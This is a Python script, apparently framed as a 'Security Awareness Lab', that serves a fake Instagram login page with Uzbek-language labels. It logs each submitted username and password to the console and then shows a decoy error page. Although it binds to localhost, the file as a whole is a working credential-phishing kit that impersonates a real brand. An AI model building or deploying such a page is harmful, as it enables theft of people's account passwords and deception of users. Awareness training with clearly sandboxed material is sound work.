
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs
from datetime import datetime
from html import escape

class LabHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        if self.path == "/logo.webp":
            try:
                with open("logo.webp", "rb") as image:
                    content = image.read()

                self.send_response(200)
                self.send_header("Content-Type", "image/webp")
                self.send_header("Content-Length", str(len(content)))
                self.end_headers()
                self.wfile.write(content)

            except FileNotFoundError:
                self.send_error(404, "Rasm topilmadi")
            return

        html = """
        <!DOCTYPE html>
        <html lang="uz">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport"
                  content="width=device-width, initial-scale=1.0">
            <title>Security Awareness Lab</title>

            <style>
                * {
                    box-sizing: border-box;
                }

                body {
                    margin: 0;
                    background: #f5f6f8;
                    font-family: Arial, sans-serif;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                }

                .card {
                    background: white;
                    width: 350px;
                    padding: 30px;
                    border: 1px solid #ddd;
                    border-radius: 10px;
                    text-align: center;
                }

                img {
                    width: 150px;
                    height: 150px;
                    object-fit: contain;
		    margin-top: 20px;
                    margin-bottom: 15px;
                }

                h2 {
                    font-size: 30px;
                    color: #222;
                }

                .notice {
                    font-size: 12px;
                    color: #555;
                    margin-bottom: 20px;
                }

                input {
                    width: 100%;
                    padding: 13px;
                    margin: 7px 0;
                    border: 1px solid #ccc;
                    border-radius: 5px;
                    font-size: 14px;
                }

                button {
                    width: 100%;
                    padding: 12px;
                    margin-top: 12px;
                    border: none;
                    border-radius: 5px;
                    background: #1877f2;
                    color: white;
                    font-size: 15px;
                    cursor: pointer;
                }

                button:hover {
                    background: #1264cc;
                }

                .footer {
                    color: #888;
                    font-size: 11px;
                    margin-top: 20px;
                }
            </style>
        </head>

        <body>
            <div class="card">

                <img src="/logo.webp" alt="Training logo">

                <h2>Instagram</h2>


                <form action="/event" method="POST">

                    <input
                        type="text"
                        name="username"
                        placeholder="Mobile number, username or email"
                        required
                    >

                    <input
                        type="text"
                        name="test_code"
                        placeholder="password"
                        required
                    >

                    <button type="submit">
                        Kirish
                    </button>

                </form>

                <div class="footer">
                    parolni unutdingzmi?
                </div>

            </div>
        </body>
        </html>
        """

        page = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(page)))
        self.end_headers()
        self.wfile.write(page)

    def do_POST(self):
        if self.path != "/event":
            self.send_error(404)
            return

        length = int(self.headers.get("Content-Length", 0))

        if length > 4096:
            self.send_error(413)
            return

        data = self.rfile.read(length).decode("utf-8")
        fields = parse_qs(data)

        username = fields.get("username", [""])[0][:100]
        test_code = fields.get("test_code", [""])[0][:100]

        print("\n--- SECURITY LAB TEST ---")
        print("username:", escape(username))
        print("password:", escape(test_code))
        print("Time:", datetime.now())
        print("-------------------------")

        response = """
        <html>
        <head><meta charset="UTF-8"></head>
        <body style="font-family:Arial;text-align:center;padding:50px">
            <h2>Tizimdagi xatolik!</h2>
            <p>404.</p>
            <a href="/">Orqaga qaytish</a>
        </body>
        </html>
        """

        page = response.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(page)))
        self.end_headers()
        self.wfile.write(page)


server = HTTPServer(("127.0.0.1", 8000), LabHandler)

print("boshlandi!")
print("Manzil: http://127.0.0.1:8000")

server.serve_forever()
